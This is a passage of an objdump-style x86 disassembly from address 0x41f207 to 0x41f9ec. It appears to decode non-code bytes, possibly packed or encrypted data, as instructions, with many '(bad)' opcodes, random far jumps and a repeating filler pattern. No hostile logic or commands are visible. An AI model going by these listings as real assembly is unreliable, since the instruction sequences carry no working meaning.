  41f207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f208:	out    0xbc,eax
  41f20a:	or     BYTE PTR [eax*1-0x3fcbc7c7],ch
  41f211:	rcl    BYTE PTR ds:[ecx],cl
  41f214:	xchg   ebp,eax
  41f215:	imul   esi,DWORD PTR [edx],0xee0aa820
  41f21b:	lahf   
  41f21c:	scas   al,BYTE PTR es:[edi]
  41f21d:	add    ecx,DWORD PTR [edx+0x367bf596]
  41f223:	xor    edi,edx
  41f225:	jge    0x41f231
  41f227:	mov    dh,0x6f
  41f229:	sbb    DWORD PTR [edx],ebx
  41f22b:	or     BYTE PTR [eax],dh
  41f22d:	pop    ebx
  41f22e:	fldcw  WORD PTR [ebx+0x10]
  41f231:	out    dx,eax
  41f232:	jmp    0x41f267
  41f234:	sbb    al,0x95
  41f236:	sub    ebp,DWORD PTR [ebx-0x46]
  41f239:	mov    bl,0x9d
  41f23b:	cmp    DWORD PTR [edx],ecx
  41f23d:	xor    dl,BYTE PTR [eax]
  41f23f:	mov    cl,0x72
  41f241:	cwde   
  41f242:	jmp    0xb2fe:0x13d81173
  41f249:	popa   
  41f24a:	jg     0x41f21f
  41f24c:	xor    al,0x7
  41f24e:	push   0xbffc0de6
  41f253:	fistp  QWORD PTR [esi+0x58164432]
  41f259:	icebp  
  41f25a:	je     0x41f22d
  41f25c:	add    esi,DWORD PTR [ebx-0x1fb4406]
  41f262:	and    esp,DWORD PTR [edx-0xb50fbd5]
  41f268:	dec    ecx
  41f269:	jae    0x41f25b
  41f26b:	mov    edx,0x888f6e74
  41f270:	dec    ebx
  41f271:	inc    esi
  41f272:	shr    BYTE PTR [ecx+0x535f3070],1
  41f278:	std    
  41f279:	xchg   ebx,eax
  41f27a:	cmp    esp,edx
  41f27c:	xor    BYTE PTR [eax+0x3a372e],al
  41f282:	push   DWORD PTR [ebx]
  41f284:	popf   
  41f285:	outs   dx,DWORD PTR ds:[esi]
  41f286:	inc    edi
  41f287:	cmp    eax,0xed079187
  41f28c:	cmp    al,0xb3
  41f28e:	jmp    0x42d4a3a3
  41f293:	and    eax,0xa8edb2b1
  41f298:	cmp    cl,BYTE PTR ss:[ebx-0x1e52487e]
  41f29f:	xchg   ecx,ebp
  41f2a1:	sbb    DWORD PTR [ebx],0x633398db
  41f2a7:	or     esi,ebp
  41f2a9:	sub    al,0xc5
  41f2ab:	xchg   esp,eax
  41f2ac:	add    BYTE PTR ss:[eax],al
	...
  41f2bb:	fwait
  41f2bc:	loope  0x41f32b
  41f2be:	sub    eax,0xf7dbad7f
  41f2c3:	sar    BYTE PTR [ebx],cl
  41f2c5:	(bad)  
  41f2c6:	add    BYTE PTR [ecx],ch
  41f2c8:	dec    BYTE PTR [esi-0x3c]
  41f2cb:	dec    ebx
  41f2cc:	xchg   esp,eax
  41f2cd:	add    DWORD PTR [eax],eax
  41f2cf:	stos   BYTE PTR es:[edi],al
  41f2d0:	add    BYTE PTR [eax],al
  41f2d2:	add    BYTE PTR [edi+edx*8],dl
  41f2d5:	and    al,BYTE PTR [ebx+0x67]
  41f2d8:	pop    esi
  41f2d9:	fxch   st(2)
  41f2db:	xchg   DWORD PTR es:[eax+0x3ba78bce],ebp
  41f2e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2e3:	je     0x41f321
  41f2e5:	jnp    0x41f2af
  41f2e7:	jle    0x41f353
  41f2e9:	push   ds
  41f2ea:	cmp    al,0x38
  41f2ec:	rcr    BYTE PTR [esi+0x4919ca4c],0x9
  41f2f3:	scas   eax,DWORD PTR es:[edi]
  41f2f4:	leave  
  41f2f5:	jnp    0x41f315
  41f2f7:	shr    BYTE PTR [ebx],1
  41f2f9:	mov    dl,0xc5
  41f2fb:	aas    
  41f2fc:	add    DWORD PTR [esi-0xaddedbb],eax
  41f302:	iret   
  41f303:	xor    BYTE PTR [eax+eax*4],ch
  41f306:	mov    gs,WORD PTR [eax-0x189309b]
  41f30c:	sbb    al,0x72
  41f30e:	dec    esp
  41f30f:	ins    DWORD PTR es:[edi],dx
  41f310:	not    BYTE PTR [esi-0x549955d3]
  41f316:	int    0x4d
  41f318:	iret   
  41f319:	mov    ebp,0x77f2b75d
  41f31e:	mov    esp,0x86023a99
  41f323:	popf   
  41f324:	add    eax,DWORD PTR [ebp-0x46461aca]
  41f32a:	es lahf 
  41f32c:	sub    BYTE PTR [ebx+0x7694bbe8],bl
  41f332:	popa   
  41f333:	pushw  ss
  41f335:	lahf   
  41f336:	lds    ecx,FWORD PTR [ebx+edx*8+0x3ebf8e52]
  41f33d:	pop    ebx
  41f33e:	outs   dx,BYTE PTR ds:[esi]
  41f33f:	sbb    eax,edi
  41f341:	gs int 0x15
  41f344:	std    
  41f345:	(bad)  
  41f346:	(bad)  
  41f347:	stos   DWORD PTR es:[edi],eax
  41f348:	data16 out 0x61,al
  41f34b:	scas   al,BYTE PTR es:[edi]
  41f34c:	lods   eax,DWORD PTR ds:[esi]
  41f34d:	xchg   esp,eax
  41f34e:	xchg   esi,eax
  41f34f:	rcr    DWORD PTR [ecx-0x65],0xb0
  41f353:	add    dh,BYTE PTR [edi]
  41f355:	mov    ebx,edi
  41f357:	push   ebp
  41f358:	and    eax,0x8a592907
  41f35d:	lock ss mov ebp,0xb9e80567
  41f364:	xor    eax,0x91afc438
  41f369:	cmp    al,0xe9
  41f36b:	leave  
  41f36c:	stos   BYTE PTR es:[edi],al
  41f36d:	sub    DWORD PTR [ebx-0x46],esp
  41f370:	xchg   esp,eax
  41f371:	and    cl,BYTE PTR [eax+edx*4-0x51]
  41f375:	into   
  41f376:	pusha  
  41f377:	aad    0xa4
  41f379:	int    0x5
  41f37b:	xor    ch,BYTE PTR [eax+0x0]
	...
  41f389:	add    BYTE PTR [eax],al
  41f38b:	or     bh,dh
  41f38d:	ja     0x41f3d9
  41f38f:	dec    edx
  41f391:	cmp    eax,0x2e8eedf7
  41f396:	dec    eax
  41f397:	mov    ds:0xf52b00e3,eax
  41f39c:	xchg   esp,eax
  41f39d:	add    DWORD PTR [eax],eax
  41f39f:	stos   BYTE PTR es:[edi],al
  41f3a0:	add    BYTE PTR [eax],al
  41f3a2:	add    BYTE PTR [esi],ch
  41f3a4:	xor    BYTE PTR [ebx+0x69],cl
  41f3a7:	lods   eax,DWORD PTR ds:[esi]
  41f3a8:	jo     0x41f37e
  41f3aa:	pop    esp
  41f3ab:	adc    eax,0xff54e885
  41f3b0:	mov    cl,0x2
  41f3b2:	push   ds
  41f3b3:	(bad)  
  41f3b4:	mov    ch,0xac
  41f3b6:	loop   0x41f383
  41f3b8:	mov    ah,0xf7
  41f3ba:	push   0x8e105a7d
  41f3bf:	inc    esp
  41f3c0:	mov    eax,0x3277b4a3
  41f3c5:	and    DWORD PTR [ebx+0xc608f58],0xf2e8ae7f
  41f3cf:	test   BYTE PTR [edi+0x5],cl
  41f3d2:	xchg   esp,eax
  41f3d3:	push   0x7
  41f3d5:	imul   esp,DWORD PTR [esi],0xffffffe8
  41f3d8:	pop    ebx
  41f3d9:	addr16 nop
  41f3db:	retf   
  41f3dc:	mul    DWORD PTR ds:0x366ae85e
  41f3e2:	add    DWORD PTR [edi-0x17],esp
  41f3e5:	into   
  41f3e6:	pop    ebx
  41f3e7:	and    DWORD PTR [ecx-0x38],eax
  41f3ea:	jne    0x41f462
  41f3ec:	nop
  41f3ed:	and    edx,DWORD PTR [ebx-0x15]
  41f3f0:	and    cl,ah
  41f3f2:	sbb    ah,BYTE PTR [edi]
  41f3f4:	cwde   
  41f3f5:	sbb    eax,0x69a4a470
  41f3fa:	jmp    0x6ff4:0x5caf0204
  41f401:	dec    ecx
  41f402:	sub    ch,dl
  41f404:	push   0xe7a75b6d
  41f409:	inc    esp
  41f40a:	sbb    al,0x0
  41f40c:	xor    BYTE PTR [ebx],0x47
  41f40f:	in     al,dx
  41f410:	xchg   BYTE PTR [ecx],cl
  41f412:	mov    ds:0x652630f0,eax
  41f417:	pushf  
  41f418:	call   0x7d74:0xbb12a35d
  41f41f:	jo     0x41f3ab
  41f421:	dec    edx
  41f422:	mov    ds:0x26e8b6b,al
  41f427:	repnz or DWORD PTR [ecx],ecx
  41f42a:	push   ss
  41f42b:	adc    edi,DWORD PTR [edi-0x53babb54]
  41f431:	add    eax,0xae783fe9
  41f436:	pop    eax
  41f437:	pop    eax
  41f438:	push   eax
  41f439:	mov    esp,0x5d03861d
  41f43e:	jmp    0xab610233
  41f443:	mov    ds:0x70825355,eax
  41f448:	mov    ds:0x1f1c15a0,eax
	...
  41f459:	add    BYTE PTR [eax],al
  41f45b:	arpl   WORD PTR ss:[eax-0x10],bp
  41f45f:	jge    0x41f45c
  41f461:	mov    esi,0x8c7853e7
  41f466:	daa    
  41f467:	push   esi
  41f468:	xchg   DWORD PTR [ebx],ebp
  41f46a:	dec    ecx
  41f46b:	lahf   
  41f46c:	xchg   ebp,eax
  41f46d:	add    DWORD PTR [eax],eax
  41f46f:	stos   BYTE PTR es:[edi],al
  41f470:	add    BYTE PTR [eax],al
  41f472:	add    BYTE PTR [ebx-0x78],bh
  41f475:	ja     0x41f4e4
  41f477:	dec    ebp
  41f478:	shl    BYTE PTR ds:0x707c163f,1
  41f47e:	mov    DWORD PTR [ebp+0x15],edi
  41f481:	xor    BYTE PTR [eax+edx*8+0x794c256],ch
  41f488:	push   ss
  41f489:	xor    BYTE PTR [ebx-0x5f6bbe0f],dl
  41f48f:	mov    ch,0x34
  41f491:	pop    es
  41f492:	cmp    ebx,DWORD PTR [edi-0x1ddc0a01]
  41f498:	imul   eax,edx,0xf01be5c3
  41f49e:	cld    
  41f49f:	enter  0x807a,0x14
  41f4a3:	ins    DWORD PTR es:[edi],dx
  41f4a4:	mov    dh,0xa3
  41f4a6:	cmp    DWORD PTR [ecx-0xe],ebx
  41f4a9:	mov    DWORD PTR [ebp-0xc0f3ead],ebx
  41f4af:	std    
  41f4b0:	jne    0x41f4f7
  41f4b2:	mov    ebx,0x514fa463
  41f4b7:	adc    al,0xd4
  41f4b9:	cwde   
  41f4ba:	jmp    0x9917c4b9
  41f4bf:	add    eax,0xfd44b9bd
  41f4c4:	add    edi,ecx
  41f4c6:	mov    ecx,0x1bfba94c
  41f4cb:	add    al,0x2b
  41f4cd:	inc    ebp
  41f4ce:	das    
  41f4cf:	ret    
  41f4d0:	stc    
  41f4d1:	lds    edx,FWORD PTR [esi-0x2]
  41f4d4:	pop    ebx
  41f4d5:	sub    esi,esp
  41f4d7:	imul   ecx,DWORD PTR [esi-0x31116dd],0x45d6f041
  41f4e1:	inc    esp
  41f4e2:	fbstp  TBYTE PTR [ecx]
  41f4e4:	hlt    
  41f4e5:	mov    dl,dh
  41f4e7:	out    0x8d,eax
  41f4e9:	test   DWORD PTR [edx+0x6d],0xb38376
  41f4f0:	test   dh,0x8d
  41f4f3:	xor    ch,BYTE PTR [ebx]
  41f4f5:	sbb    al,0x6e
  41f4f7:	pop    es
  41f4f8:	push   esp
  41f4f9:	call   0xa0ac19d
  41f4fe:	fsub   QWORD PTR [ecx]
  41f500:	push   0xffffffc1
  41f502:	inc    esp
  41f503:	imul   esi,ebx,0xffffffd9
  41f506:	cmp    esi,ebx
  41f508:	push   edi
  41f509:	inc    esi
  41f50a:	lods   al,BYTE PTR ds:[esi]
  41f50b:	ss sbb eax,0x6766a829
  41f511:	cmp    DWORD PTR ds:0x281d52c2,ecx
  41f517:	(bad)  
  41f518:	sbb    eax,0xcf60974d
	...
  41f529:	add    BYTE PTR [eax],al
  41f52b:	daa    
  41f52c:	ss lahf 
  41f52e:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f534:	and    eax,0x6ab1075b
  41f539:	push   esi
  41f53a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f53b:	out    0xa2,eax
  41f53d:	add    DWORD PTR [eax],eax
  41f53f:	stos   BYTE PTR es:[edi],al
  41f540:	add    BYTE PTR [eax],al
  41f542:	add    BYTE PTR [edx],ch
  41f544:	adc    DWORD PTR [ecx-0x30],0xffffffa4
  41f548:	lods   al,BYTE PTR ds:[esi]
  41f549:	mov    WORD PTR [edi+0x93ee089],fs
  41f54f:	dec    ebx
  41f550:	jns    0x41f50c
  41f552:	loope  0x41f4fc
  41f554:	dec    esp
  41f555:	repnz xchg ah,dh
  41f558:	jmp    0xfbf2:0xc5689194
  41f55f:	or     ecx,DWORD PTR [eax+0x5df6d662]
  41f565:	pop    ecx
  41f566:	stc    
  41f567:	adc    eax,0x9393d973
  41f56c:	jecxz  0x41f4f7
  41f56e:	sub    eax,DWORD PTR [ebx]
  41f570:	aad    0x19
  41f572:	or     dl,ch
  41f574:	mov    eax,ebp
  41f576:	add    edi,DWORD PTR [esi-0x4dcb41d0]
  41f57c:	jns    0x41f59d
  41f57e:	xor    DWORD PTR [eax-0x41629128],esi
  41f584:	test   eax,0x888e4b6f
  41f589:	mov    cl,ah
  41f58b:	pop    ebp
  41f58c:	scas   al,BYTE PTR es:[edi]
  41f58d:	mov    ecx,0x9d0e8923
  41f592:	cmp    BYTE PTR [edi+0x22],al
  41f595:	inc    eax
  41f596:	rol    cl,cl
  41f598:	push   cs
  41f599:	xor    dh,bl
  41f59b:	or     esi,eax
  41f59d:	idiv   DWORD PTR ds:0x73b492dd
  41f5a3:	dec    edx
  41f5a4:	adc    eax,0x1a420797
  41f5a9:	jns    0x41f5fc
  41f5ab:	pop    edx
  41f5ac:	push   0x86ede9b
  41f5b1:	or     BYTE PTR [ebx],ah
  41f5b3:	popf   
  41f5b4:	pop    es
  41f5b5:	push   ecx
  41f5b6:	push   es
  41f5b7:	aam    0x66
  41f5b9:	(bad)  
  41f5ba:	jle    0x41f60b
  41f5bc:	inc    edi
  41f5bd:	cmp    al,0x90
  41f5bf:	dec    eax
  41f5c0:	inc    ebp
  41f5c2:	ror    DWORD PTR ds:0x6d64d9a5,0x59
  41f5c9:	mov    edx,DWORD PTR [esi+0x1a]
  41f5cc:	jmp    0xc2d6:0x12584a5f
  41f5d3:	(bad)  
  41f5d6:	retf   
  41f5d7:	out    0x24,al
  41f5d9:	pop    es
  41f5da:	or     DWORD PTR ds:0x6b3a539e,ebp
  41f5e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5e1:	popf   
  41f5e2:	mov    al,0xfa
  41f5e4:	adc    edi,ecx
  41f5e6:	loopne 0x41f63b
  41f5e8:	test   dh,dh
  41f5ea:	adc    DWORD PTR [edi+0xd8],edi
	...
  41f5f8:	add    BYTE PTR [eax],al
  41f5fa:	add    BYTE PTR [edi],dh
  41f5fc:	(bad)  
  41f5fd:	out    0xc2,eax
  41f5ff:	mul    ebx
  41f601:	aaa    
  41f602:	cmc    
  41f603:	xchg   ecx,eax
  41f604:	call   0x687c:0xd678eef4
  41f60b:	xchg   ecx,eax
  41f60c:	mov    ds:0xaa0001,eax
  41f611:	add    BYTE PTR [eax],al
  41f613:	mov    ?,WORD PTR [edi+0x18eeab0a]
  41f619:	sbb    DWORD PTR [edx],0xaa83acf
  41f61f:	fwait
  41f620:	mov    edi,0xb90bace4
  41f625:	xchg   ebx,eax
  41f626:	xchg   edx,eax
  41f627:	aas    
  41f628:	cli    
  41f629:	mov    al,ds:0x72e4ee2b
  41f62e:	and    ah,cl
  41f630:	lock sti 
  41f632:	adc    BYTE PTR [ecx+0xd9d5f57],bh
  41f638:	enter  0x71b1,0x7b
  41f63c:	or     DWORD PTR [ebx+0x5481384e],ecx
  41f642:	push   edx
  41f643:	mov    ebp,0x886e1a21
  41f648:	addr16 mov cl,0xf5
  41f64b:	sub    al,0x36
  41f64d:	jo     0x41f63a
  41f64f:	js     0x41f6a4
  41f651:	push   0x3ee1489d
  41f656:	hlt    
  41f657:	mov    esp,0x57263599
  41f65c:	jmp    0x41f5e3
  41f65e:	push   ds
  41f65f:	fcom   DWORD PTR ds:0x27be5948
  41f665:	rcl    ebp,1
  41f667:	push   edi
  41f668:	ficomp WORD PTR ds:0xdc87c312
  41f66e:	cli    
  41f66f:	mov    WORD PTR [eax-0x5c06dfad],cs
  41f675:	in     eax,0xd0
  41f677:	add    edx,DWORD PTR [edx]
  41f679:	retf   
  41f67a:	es mov ecx,0x9cf3f0c7
  41f680:	sbb    ebp,DWORD PTR [eax+0x34b23e93]
  41f686:	fs call 0x56a447c6
  41f68c:	xchg   esp,ecx
  41f68e:	push   ss
  41f68f:	stc    
  41f690:	xchg   DWORD PTR [esi-0x79035d2c],ebp
  41f696:	push   eax
  41f697:	call   0xe6ed:0x5abc3df6
  41f69e:	adc    dl,BYTE PTR [edx]
  41f6a0:	pop    ds
  41f6a1:	sbb    al,0xf4
  41f6a3:	retf   
  41f6a4:	int3   
  41f6a5:	xchg   ebx,eax
  41f6a6:	mov    BYTE PTR [esi+eax*4-0x9],al
  41f6aa:	pop    eax
  41f6ab:	inc    esp
  41f6ac:	leave  
  41f6ad:	into   
  41f6ae:	or     DWORD PTR [edx+edi*8],0x28
  41f6b2:	outs   dx,BYTE PTR ds:[esi]
  41f6b3:	out    dx,eax
  41f6b4:	mov    ds:0xfc21c7f,al
  41f6b9:	jl     0x41f722
  41f6bb:	dec    eax
  41f6bc:	dec    eax
	...
  41f6c9:	add    BYTE PTR [eax],al
  41f6cb:	push   ss
  41f6cc:	aad    0xdf
  41f6ce:	out    dx,eax
  41f6cf:	fucomip st,st(7)
  41f6d1:	ss std 
  41f6d3:	cmp    BYTE PTR [esi-0x12f0a0c6],al
  41f6d9:	or     al,0xd9
  41f6db:	cmp    esp,DWORD PTR [ecx+eax*1+0xaa00]
  41f6e2:	add    BYTE PTR [ecx],bl
  41f6e4:	enter  0x2e51,0x3c
  41f6e8:	int    0x72
  41f6ea:	mov    dh,0x50
  41f6ec:	aas    
  41f6ed:	xchg   ebp,eax
  41f6ee:	in     eax,0xca
  41f6f0:	xchg   ecx,eax
  41f6f1:	jne    0x41f69c
  41f6f3:	sub    bh,ah
  41f6f5:	adc    BYTE PTR [ecx-0x6e],0xd1
  41f6f9:	int3   
  41f6fa:	int    0x28
  41f6fc:	rcr    DWORD PTR [esi-0x382391e3],cl
  41f702:	mov    al,0x78
  41f704:	(bad)  
  41f705:	sahf   
  41f706:	lds    edi,FWORD PTR [edi-0x3fdcc4bb]
  41f70c:	cld    
  41f70d:	mov    BYTE PTR [ebx+esi*4-0x68],bl
  41f711:	add    al,0xf3
  41f713:	retf   
  41f714:	mov    eax,0xac2f9c6f
  41f719:	call   0x4410:0x4e0ee82d
  41f720:	pushf  
  41f721:	mov    ds:0x6892f25e,al
  41f726:	mov    cx,WORD PTR [esi]
  41f729:	sbb    eax,0x33b5e5ff
  41f72e:	adc    eax,0xe9cb88a5
  41f733:	(bad)  
  41f734:	fnstenv ds:0xa899bce8
  41f73a:	popf   
  41f73b:	mov    BYTE PTR [ecx+0x4ba0a26e],bh
  41f741:	retf   0x169b
  41f744:	aad    0xab
  41f746:	cwde   
  41f747:	loopne 0x41f7ac
  41f749:	scas   eax,DWORD PTR es:[edi]
  41f74a:	or     DWORD PTR [edi+eax*1],ecx
  41f74d:	stos   DWORD PTR es:[edi],eax
  41f74e:	xlat   BYTE PTR ds:[ebx]
  41f74f:	sbb    al,0xa3
  41f751:	add    al,0xd4
  41f753:	jns    0x41f6e8
  41f755:	jnp    0x41f7b1
  41f757:	mov    ebp,0x54cfd3cb
  41f75c:	add    DWORD PTR [edi],esi
  41f75e:	dec    esi
  41f75f:	jmp    FWORD PTR [ebp+0x5]
  41f762:	mov    bl,0xb9
  41f764:	aad    0xb4
  41f766:	xor    edi,ecx
  41f768:	jmp    DWORD PTR [ecx+0x2d357fef]
  41f76e:	fisubr WORD PTR [edx-0x29]
  41f771:	inc    eax
  41f772:	fst    DWORD PTR [ebp+0x3c]
  41f775:	stos   BYTE PTR es:[edi],al
  41f776:	xchg   ebx,ecx
  41f778:	mov    eax,0x57e1b535
  41f77d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f77e:	mov    al,0xf4
  41f780:	inc    ebp
  41f781:	pop    esi
  41f782:	arpl   si,bp
  41f784:	pop    eax
  41f785:	mov    esp,edi
  41f787:	xor    bh,BYTE PTR [ecx]
  41f789:	pop    esp
  41f78a:	sar    BYTE PTR [edx+edi*2],1
	...
  41f799:	add    BYTE PTR [eax],al
  41f79b:	outs   dx,BYTE PTR ds:[esi]
  41f79c:	jbe    0x41f782
  41f79e:	retf   0xdafc
  41f7a1:	outs   dx,BYTE PTR ds:[esi]
  41f7a2:	neg    BYTE PTR [eax]
  41f7a4:	xchg   edx,eax
  41f7a5:	xchg   DWORD PTR [edi+0x7f489b93],edx
  41f7ab:	in     eax,0xa4
  41f7ad:	add    DWORD PTR [eax],eax
  41f7af:	stos   BYTE PTR es:[edi],al
  41f7b0:	add    BYTE PTR [eax],al
  41f7b2:	add    BYTE PTR [edi+0x7bfcbd7f],bl
  41f7b8:	enter  0x1e0c,0x45
  41f7bc:	jb     0x41f82c
  41f7be:	mov    dl,0xe7
  41f7c0:	jmp    0x849949d9
  41f7c5:	mov    dl,0x14
  41f7c7:	arpl   WORD PTR [edx-0x650e3816],bx
  41f7cd:	and    al,ch
  41f7cf:	shl    ch,1
  41f7d1:	out    0x3c,eax
  41f7d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7d4:	rol    DWORD PTR [edi+ecx*8-0x4dfe1f45],1
  41f7db:	mov    ecx,0x120df1db
  41f7e0:	cs jmp 0x7e85:0xa1b62372
  41f7e8:	mov    al,BYTE PTR ss:[ebx+0x61]
  41f7ec:	pop    DWORD PTR [eax]
  41f7ee:	and    eax,0x312a48fb
  41f7f3:	push   esi
  41f7f4:	mov    ds:0x686658b4,eax
  41f7f9:	inc    edx
  41f7fa:	shr    BYTE PTR [edi+0x5477eb4],cl
  41f800:	lahf   
  41f801:	jecxz  0x41f7a0
  41f803:	jmp    0xba18:0x16fdcaf4
  41f80a:	and    DWORD PTR [edi+eax*8],0x4c
  41f80e:	cmp    bl,BYTE PTR [edi+0x78]
  41f811:	inc    ecx
  41f812:	fucom  st(4)
  41f814:	cmp    DWORD PTR [edi],0xffffffc1
  41f817:	int    0x81
  41f819:	mov    DWORD PTR [ebx],eax
  41f81b:	pop    ebp
  41f81c:	add    esp,edi
  41f81e:	stos   BYTE PTR es:[edi],al
  41f81f:	fwait
  41f820:	repnz addr16 push cs
  41f823:	push   0x6c
  41f825:	cdq    
  41f826:	rcl    BYTE PTR [edi+0x74],1
  41f829:	push   0xffffff82
  41f82b:	outs   dx,BYTE PTR ds:[esi]
  41f82c:	rcl    DWORD PTR [ebx],1
  41f82e:	daa    
  41f82f:	jae    0x41f885
  41f831:	pushf  
  41f832:	in     eax,dx
  41f833:	inc    eax
  41f834:	(bad)  
  41f835:	aas    
  41f836:	pop    ecx
  41f837:	lods   eax,DWORD PTR ds:[esi]
  41f838:	mov    esi,esp
  41f83a:	daa    
  41f83b:	rcr    cl,cl
  41f83d:	ja     0x41f8b8
  41f83f:	vpackuswb ymm3,ymm3,YMMWORD PTR [ecx+0x79]
  41f844:	mov    cl,0xdc
  41f846:	not    ecx
  41f848:	jmp    0x41f82b
  41f84a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f84b:	ja     0x41f814
  41f84d:	shr    esp,cl
  41f84f:	add    ecx,eax
  41f851:	retf   0xfaef
  41f854:	mov    bl,0xc0
  41f856:	or     BYTE PTR [edi+0x79],ch
  41f859:	pop    edi
  41f85a:	dec    ebx
  41f85b:	cmp    ch,0x0
	...
  41f86a:	add    BYTE PTR [edx],bh
  41f86c:	push   edx
  41f86d:	les    ecx,FWORD PTR [edi]
  41f86f:	in     al,dx
  41f870:	lahf   
  41f871:	sti    
  41f872:	ja     0x41f86a
  41f874:	rcl    DWORD PTR [eax+0x67273d3],1
  41f87a:	or     DWORD PTR [edi-0x55fffe5b],0x0
  41f881:	add    BYTE PTR [eax],al
  41f883:	add    DWORD PTR [ecx+ebp*2],ecx
  41f886:	jmp    0x5855b3a4
  41f88b:	(bad)  
  41f88c:	imul   ebp,DWORD PTR [edx],0x6b88bfcf
  41f892:	push   cs
  41f893:	push   eax
  41f894:	adc    al,BYTE PTR [edx+0x7af4eea5]
  41f89a:	repnz cli 
  41f89c:	dec    eax
  41f89d:	pusha  
  41f89e:	mov    edi,0xb2754257
  41f8a3:	add    dh,BYTE PTR [edx]
  41f8a5:	sbb    ecx,DWORD PTR [edi+edx*2+0x6671c87a]
  41f8ac:	daa    
  41f8ad:	fwait
  41f8ae:	or     al,0x2e
  41f8b0:	dec    edx
  41f8b1:	test   eax,0x807507eb
  41f8b6:	and    ebx,edi
  41f8b8:	addr16 push cs
  41f8ba:	lahf   
  41f8bb:	mov    ?,WORD PTR [eax+0x3ec21860]
  41f8c1:	pop    ds
  41f8c2:	(bad)  
  41f8c3:	out    0x69,eax
  41f8c5:	or     ebx,ecx
  41f8c7:	inc    edi
  41f8c8:	mov    BYTE PTR [ebp+0x2c],ah
  41f8cb:	push   esi
  41f8cc:	dec    eax
  41f8cd:	daa    
  41f8ce:	cmp    al,0xfa
  41f8d0:	or     ecx,ebp
  41f8d2:	xlat   BYTE PTR ds:[ebx]
  41f8d3:	mov    ds:0xb0c0d5f1,eax
  41f8d8:	mov    dl,0xf6
  41f8da:	js     0x41f905
  41f8dc:	ins    DWORD PTR es:[edi],dx
  41f8dd:	jbe    0x41f8ca
  41f8df:	inc    edi
  41f8e0:	lahf   
  41f8e1:	add    ebp,edx
  41f8e3:	syscall 
  41f8e5:	fist   WORD PTR [eax-0x15]
  41f8e8:	mov    edi,DWORD PTR [esi]
  41f8ea:	adc    esp,DWORD PTR [ebx]
  41f8ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8ed:	sbb    eax,0x18b48e84
  41f8f2:	out    dx,al
  41f8f3:	push   0xcd2eb923
  41f8f8:	mov    DWORD PTR [edi],edi
  41f8fa:	and    DWORD PTR [ecx],0x28
  41f8fd:	daa    
  41f8fe:	and    ah,BYTE PTR [ecx+0x7]
  41f901:	push   eax
  41f902:	dec    eax
  41f903:	pop    eax
  41f904:	sbb    ch,BYTE PTR [eax+0x6d]
  41f907:	xchg   edx,eax
  41f908:	frstor [ecx+edi*1]
  41f90b:	add    BYTE PTR [esi+0x1951282b],al
  41f911:	jae    0x41f91d
  41f913:	push   edx
  41f914:	jg     0x41f8e1
  41f916:	aas    
  41f917:	popa   
  41f918:	xor    cl,BYTE PTR [ecx-0x2f911f44]
  41f91e:	xor    edx,DWORD PTR [eax+ebp*2-0x5d]
  41f922:	imul   edi,DWORD PTR [esi],0xffffffe3
  41f925:	btc    DWORD PTR [eax],esp
  41f928:	mov    esp,0xc401d333
	...
  41f939:	add    BYTE PTR [eax],al
  41f93b:	xchg   ebx,eax
  41f93c:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  41f943:	push   eax
  41f944:	loopne 0x41f940
  41f946:	call   0xa639:0x920c6b4c
  41f94d:	add    DWORD PTR [eax],eax
  41f94f:	stos   BYTE PTR es:[edi],al
  41f950:	add    BYTE PTR [eax],al
  41f952:	add    ch,al
  41f954:	je     0x41f976
  41f956:	iret   
  41f957:	and    edi,ebp
  41f959:	sub    edi,esi
  41f95b:	call   0xdd4a:0x3499940f
  41f962:	not    BYTE PTR [edi+0x5200e7ec]
  41f968:	inc    edi
  41f969:	pop    ebx
  41f96a:	int    0x71
  41f96c:	jae    0x41f9b6
  41f96e:	out    0x1c,al
  41f970:	and    esp,DWORD PTR [esp+ebp*8+0x75]
  41f974:	sub    ah,BYTE PTR [eax]
  41f976:	and    BYTE PTR [esi+0x105789ee],bl
  41f97c:	mov    dh,0x91
  41f97e:	(bad)  
  41f97f:	jo     0x41f9f4
  41f981:	push   ss
  41f982:	scas   eax,DWORD PTR es:[edi]
  41f983:	xchg   esi,eax
  41f984:	inc    ebp
  41f985:	out    0x51,eax
  41f987:	shl    DWORD PTR [esi+0x7ef69d71],cl
  41f98d:	jo     0x41f924
  41f98f:	or     dl,BYTE PTR [esp+edx*2-0x70]
  41f993:	dec    ebp
  41f994:	jae    0x41f949
  41f996:	sbb    eax,DWORD PTR [eax+eiz*1]
  41f999:	add    al,0x88
  41f99b:	(bad)
  41f99e:	cld    
  41f99f:	std    
  41f9a0:	sti    
  41f9a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9a2:	add    al,0x16
  41f9a4:	lock jg 0x41fa20
  41f9a7:	les    ebp,FWORD PTR [eax+0x6c4633fc]
  41f9ad:	mov    ds:0xb88f5a48,eax
  41f9b2:	sub    ebx,ecx
  41f9b4:	in     al,dx
  41f9b5:	mov    edx,DWORD PTR [edi-0xb]
  41f9b8:	cs fnsetpm(287 only) 
  41f9bb:	cmp    al,0xf6
  41f9bd:	push   0xfc85945c
  41f9c2:	ins    BYTE PTR es:[edi],dx
  41f9c3:	lahf   
  41f9c4:	fcomp  QWORD PTR [esi+0x1c]
  41f9c7:	lahf   
  41f9c8:	push   edi
  41f9c9:	iret   
  41f9ca:	addr16 dec esi
  41f9cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9cd:	jnp    0x41f9aa
  41f9cf:	lea    ebx,[edx+0x3821933b]
  41f9d5:	mov    cl,0xb6
  41f9d7:	ss (bad) 
  41f9d9:	mov    al,ds:0x49cc6cb8
  41f9de:	xchg   esi,eax
  41f9df:	jp     0x41f98d
  41f9e1:	lahf   
  41f9e2:	loope  0x41fa12
  41f9e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9e5:	mov    DWORD PTR [ecx],edi
  41f9e7:	mov    edx,0x2ab75572
  41f9ec:	test   esp,0xe9810832
